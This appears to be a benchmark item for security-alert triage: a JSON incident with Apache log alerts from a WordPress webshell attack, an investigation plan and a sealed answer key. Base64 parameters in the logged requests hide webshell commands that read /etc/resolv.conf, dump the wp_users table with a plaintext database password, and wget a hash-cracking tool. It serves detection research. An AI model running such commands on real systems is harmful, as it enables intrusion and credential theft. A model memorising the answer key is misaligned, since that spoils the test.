@@ -1,0 +1,195 @@
+{
+  "incident_id": "ait-wardbeck-webshell",
+  "name": "AIT-ADS wardbeck/webshell",
+  "source_benchmark": "Cyber-AIT-ADS",
+  "source_scenario": "wardbeck/webshell",
+  "alert": {
+    "timestamp": "2022-01-23T12:12:36Z",
+    "host": "wardbeck",
+    "user": "unknown",
+    "alert_type": "ait_ads_stage",
+    "summary": "AIT-ADS multi-step stage candidate on wardbeck. Identify the attack stage from telemetry."
+  },
+  "scope": {
+    "allowed_log_sources": [
+      "alerts"
+    ],
+    "start": "2022-01-23T12:12:36Z",
+    "end": "2022-01-23T12:13:45Z",
+    "hosts": [
+      "wardbeck"
+    ]
+  },
+  "telemetry": {
+    "alerts": [
+      {
+        "event_id": "ait-0001-a088c472",
+        "timestamp": "2022-01-23T12:12:36Z",
+        "host": "wardbeck",
+        "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+        "message": "10.132.56.81 - - [23/Jan/2022:12:12:36 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd HTTP/1.1\" 200 507494 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642939956.0,
+          "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+          "message": "10.132.56.81 - - [23/Jan/2022:12:12:36 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd HTTP/1.1\" 200 507494 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0002-9731398c",
+        "timestamp": "2022-01-23T12:13:43Z",
+        "host": "wardbeck",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.132.56.81 - - [23/Jan/2022:12:13:43 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 508127 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642940023.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.132.56.81 - - [23/Jan/2022:12:13:43 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 508127 \"-\" \"python-requests/2.27.1\""
+        }
+      },
+      {
+        "event_id": "ait-0003-bc7cbb19",
+        "timestamp": "2022-01-23T12:13:45Z",
+        "host": "wardbeck",
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.132.56.81 - - [23/Jan/2022:12:13:45 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506737 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642940025.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.132.56.81 - - [23/Jan/2022:12:13:45 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506737 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    ]
+  },
+  "oracle_evidence": [
+    {
+      "event_id": "ait-0001-a088c472",
+      "source": "alerts",
+      "timestamp": "2022-01-23T12:12:36Z",
+      "host": "wardbeck",
+      "fields": {
+        "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+        "message": "10.132.56.81 - - [23/Jan/2022:12:12:36 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd HTTP/1.1\" 200 507494 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642939956.0,
+          "detector": "AMiner: Unusual occurrence frequencies of Apache Access request methods.",
+          "message": "10.132.56.81 - - [23/Jan/2022:12:12:36 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd HTTP/1.1\" 200 507494 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0002-9731398c",
+      "source": "alerts",
+      "timestamp": "2022-01-23T12:13:43Z",
+      "host": "wardbeck",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.132.56.81 - - [23/Jan/2022:12:13:43 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 508127 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642940023.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.132.56.81 - - [23/Jan/2022:12:13:43 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D HTTP/1.1\" 200 508127 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    },
+    {
+      "event_id": "ait-0003-bc7cbb19",
+      "source": "alerts",
+      "timestamp": "2022-01-23T12:13:45Z",
+      "host": "wardbeck",
+      "fields": {
+        "detector": "AMiner: High entropy in Apache Access request.",
+        "message": "10.132.56.81 - - [23/Jan/2022:12:13:45 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506737 \"-\" \"python-requests/2.27.1\"",
+        "raw_alert": {
+          "timestamp": 1642940025.0,
+          "detector": "AMiner: High entropy in Apache Access request.",
+          "message": "10.132.56.81 - - [23/Jan/2022:12:13:45 +0000] \"GET /wp-content/uploads/2022/01/hzclekfpog-1642939939.1495.php?wp_meta=WyJ3Z2V0IiwgImh0dHBzOi8vZ2l0aHViLmNvbS9haXQtYWVjaWQvd3BoYXNoY3JhY2svYXJjaGl2ZS9yZWZzL3RhZ3MvdjAuMS50YXIuZ3oiXQ%3D%3D HTTP/1.1\" 200 506737 \"-\" \"python-requests/2.27.1\""
+        }
+      }
+    }
+  ],
+  "oracle_plan": [
+    {
+      "order": 1,
+      "question": "What processes or alerts fired in the investigation window?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "wardbeck"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 2,
+      "question": "Are there related network or secondary signals on this host?",
+      "tool": "query_events",
+      "arguments": {
+        "source": "alerts",
+        "filter": {
+          "host": "wardbeck"
+        },
+        "limit": 50
+      }
+    },
+    {
+      "order": 3,
+      "question": "What ATT&CK or detection knowledge matches this alert?",
+      "tool": "retrieve_knowledge",
+      "arguments": {
+        "question": "AIT-ADS multi-step stage candidate on wardbeck. Identify the attack stage from telemetry.",
+        "corpus_tags": [
+          "detection",
+          "attack"
+        ],
+        "top_k": 3
+      }
+    }
+  ],
+  "fixed_query_pack": {
+    "version": "converted-pack-v1",
+    "queries": [
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "wardbeck"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "query_events",
+        "arguments": {
+          "source": "alerts",
+          "filter": {
+            "host": "wardbeck"
+          },
+          "limit": 50
+        }
+      },
+      {
+        "tool": "retrieve_knowledge",
+        "arguments": {
+          "question": "AIT-ADS multi-step stage candidate on wardbeck. Identify the attack stage from telemetry.",
+          "corpus_tags": [
+            "detection"
+          ],
+          "top_k": 3
+        }
+      }
+    ]
+  },
+  "ground_truth": {
+    "dataset": "Cyber-AIT-ADS",
+    "scenario": "wardbeck/webshell",
+    "answer": "webshell",
+    "accept": [
+      "webshell",
+      "webshell"
+    ],
+    "grading": "exact_ci",
+    "sealed": true
+  }
+}
